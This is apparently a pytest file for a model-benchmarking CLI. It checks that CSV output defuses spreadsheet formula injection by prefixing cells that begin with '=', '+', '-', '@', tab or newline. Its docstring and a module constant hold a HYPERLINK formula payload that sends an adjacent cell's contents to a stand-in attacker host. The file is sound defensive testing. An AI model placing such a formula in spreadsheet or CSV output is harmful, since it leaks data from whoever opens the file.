"""CSV cells must not become live spreadsheet formulas.

A model response of `=HYPERLINK("http://evil.example/?d="&A2,"Click")` is
perfectly valid CSV and an exfiltration link the moment the file is opened in
Excel, Google Sheets or LibreOffice. Model output is the least controlled
content in the system, and `prompt_id` is worse still - it comes straight from
the batch file's `id` field, needs no model cooperation, and lands in column 1.

Every assertion here reads the RAW CSV text rather than a parsed value.
`csv.reader` hands back the apostrophe as part of the field, so a parse-level
check could pass while the file on disk is still dangerous.
"""

from __future__ import annotations

import csv
import io

import pytest

from cli_modelarium.output_formatters import (
    BatchResult,
    _format_csv,
    _format_json,
    _format_markdown,
)

# A payload that reaches a spreadsheet as a live formula. `&A2` concatenates the adjacent
# cell into the URL, which is what makes this exfiltration rather than defacement.
HYPERLINK_PAYLOAD = '=HYPERLINK("http://evil.example/?d="&A2,"Click")'

# Every column that can carry attacker-influenced text. `prompt_id` and `model`
# have never passed through an escaping helper, which is why the fix sits at the
# writer boundary instead of at the individual field assignments.
TEXT_COLUMNS = ("prompt_id", "prompt", "system", "model", "output", "error")


def _result(**overrides) -> BatchResult:
    fields = dict(
        prompt_id="p1",
        prompt="what is 2+2?",
        system=None,
        model="gpt-5.5",
        temperature=0.0,
        latency_ms=850.0,
        ttft_ms=120.0,
        input_tokens=10,
        output_tokens=5,
        cached_tokens=0,
        cost_usd=0.001,
        output="4",
        error=None,
        retries=0,
    )
    fields.update(overrides)
    return BatchResult(**fields)


def _data_row(text: str) -> str:
    """The first data row of a CSV, as raw text."""
    return text.splitlines()[1]


def _cell(text: str, column: str) -> str:
    rows = list(csv.reader(io.StringIO(text)))
    return rows[1][rows[0].index(column)]


class TestEveryFormulaPrefixIsDefused:
    """All seven characters OWASP lists as formula-initiating.

    Seven, not four: tab and the two newlines are on the list because some
    importers strip leading whitespace before deciding whether a cell is a
    formula. LF matters concretely - `_csv_escape` converts newlines for four
    fields, but `prompt_id` and `model` have no such helper, so a leading LF
    reaches those cells raw.
    """

    @pytest.mark.parametrize(
        "prefix",
        ["=", "+", "-", "@", "\t", "\r", "\n"],
        ids=["equals", "plus", "minus", "at", "tab", "cr", "lf"],
    )
    def test_prefix_is_escaped_in_the_raw_text(self, prefix: str) -> None:
        text = _format_csv([_result(prompt_id=f"{prefix}SUM(1+1)")])
        assert _cell(text, "prompt_id").startswith("'"), (
            f"a cell beginning {prefix!r} must be prefixed with an apostrophe; "
            f"raw row was {_data_row(text)!r}"
        )

    def test_the_module_constant_lists_all_seven(self) -> None:
        # Pins the set itself: dropping one would silently narrow the defence
        # while every parametrised case above still passed for the others.
        from cli_modelarium.output_formatters import FORMULA_PREFIXES

        assert set(FORMULA_PREFIXES) == {"=", "+", "-", "@", "\t", "\r", "\n"}


class TestTheDemonstratedPayload:
    def test_hyperlink_payload_does_not_start_a_cell(self) -> None:
        text = _format_csv([_result(output=HYPERLINK_PAYLOAD)])
        assert f'"{HYPERLINK_PAYLOAD[0]}' not in _data_row(text), (
            "the payload must not begin a cell unescaped"
        )
        assert _cell(text, "output") == "'" + HYPERLINK_PAYLOAD

    def test_the_value_still_round_trips(self) -> None:
        # Escape and preserve. A consumer recovers the original by removing one
        # leading apostrophe; nothing is stripped or rejected.
        text = _format_csv([_result(output=HYPERLINK_PAYLOAD)])
        assert _cell(text, "output")[1:] == HYPERLINK_PAYLOAD


class TestEveryTextColumnIsCovered:
    @pytest.mark.parametrize("column", TEXT_COLUMNS)
    def test_column_is_defused(self, column: str) -> None:
        text = _format_csv([_result(**{column: HYPERLINK_PAYLOAD})])
        cell = _cell(text, column)
        assert cell.startswith("'"), f"{column} carried the payload unescaped"
        assert cell[1:] == HYPERLINK_PAYLOAD

    def test_prompt_id_specifically(self) -> None:
        # The one that needs no model cooperation: it is the batch file's `id`.
        text = _format_csv([_result(prompt_id="-baseline")])
        assert _cell(text, "prompt_id") == "'-baseline"


class TestNumericColumnsAreUntouched:
    """A negative latency is a number, not an injection attempt."""

    def test_negative_numbers_round_trip(self) -> None:
        text = _format_csv([_result(latency_ms=-1.5, cost_usd=-0.25, temperature=-1.0)])
        assert _cell(text, "latency_ms") == "-1.5"
        assert _cell(text, "cost_usd") == "-0.25"
        assert _cell(text, "temperature") == "-1.0"

    def test_empty_numeric_cells_stay_empty(self) -> None:
        text = _format_csv([_result(latency_ms=None, ttft_ms=None)])
        assert _cell(text, "latency_ms") == ""
        assert _cell(text, "ttft_ms") == ""


class TestOrdinaryOutputIsUnchanged:
    def test_a_normal_result_is_byte_identical(self) -> None:
        # Nothing that does not begin with a formula character may move.
        text = _format_csv([_result()])
        expected = "p1,what is 2+2?,,gpt-5.5,0.0,850.0,120.0,10,5,0,0.001,4,,0,,,0,,,,,,"
        assert _data_row(text) == expected

    def test_an_interior_equals_is_left_alone(self) -> None:
        # Only the first character decides. `2+2=4` is not a formula.
        text = _format_csv([_result(output="2+2=4")])
        assert _cell(text, "output") == "2+2=4"


class TestOnlyCsvIsAffected:
    """The escape lives inside `_format_csv` on purpose.

    The same values feed JSON and Markdown. JSON has no formula-injection
    problem - `json.dumps` escapes everything structurally - and Markdown needs
    a different mitigation. An apostrophe in either would also break the
    stdout-equals-file byte identity the transport fix relies on.
    """

    def test_json_carries_the_raw_value(self) -> None:
        import json

        payload = json.loads(_format_json([_result(output=HYPERLINK_PAYLOAD)]))
        assert payload["results"][0]["output"] == HYPERLINK_PAYLOAD

    def test_markdown_carries_the_raw_value(self) -> None:
        text = _format_markdown([_result(output=HYPERLINK_PAYLOAD)])
        assert HYPERLINK_PAYLOAD in text
        assert "'" + HYPERLINK_PAYLOAD not in text

    def test_json_prompt_id_is_not_prefixed(self) -> None:
        # The documented divergence: CSV gains the apostrophe, JSON does not,
        # so a consumer joining the two formats on prompt_id must account for it.
        import json

        payload = json.loads(_format_json([_result(prompt_id="-baseline")]))
        assert payload["results"][0]["prompt_id"] == "-baseline"
        assert _cell(_format_csv([_result(prompt_id="-baseline")]), "prompt_id") == "'-baseline"


class TestTheComparePathIsCovered:
    """`compare` serializes through the same formatter, so one fix covers both.

    `_states_to_compare_results` builds `BatchResult` objects via
    `state_to_result` - the same converter `batch` uses - and hands them to
    `_format_csv`.
    """

    def test_compare_results_are_defused(self) -> None:
        from cli_modelarium.cli import _states_to_compare_results
        from cli_modelarium.streaming import StreamState

        state = StreamState(model="gpt-5.5", provider_name="openai", temperature=0.0)
        state.text = HYPERLINK_PAYLOAD
        state.status = "complete"
        state.latency_ms = 10.0

        results = _states_to_compare_results([state], prompt="a prompt")
        text = _format_csv(results)
        assert _cell(text, "output") == "'" + HYPERLINK_PAYLOAD


class TestTheColumnContractIsUnchanged:
    def test_header_is_the_canonical_23(self) -> None:
        from cli_modelarium.output_formatters import CSV_COLUMNS

        header = next(csv.reader(io.StringIO(_format_csv([_result()]))))
        assert tuple(header) == CSV_COLUMNS
        assert len(header) == 23

    def test_a_defused_row_still_has_23_fields(self) -> None:
        rows = list(csv.reader(io.StringIO(_format_csv([_result(output=HYPERLINK_PAYLOAD)]))))
        assert len(rows[1]) == 23
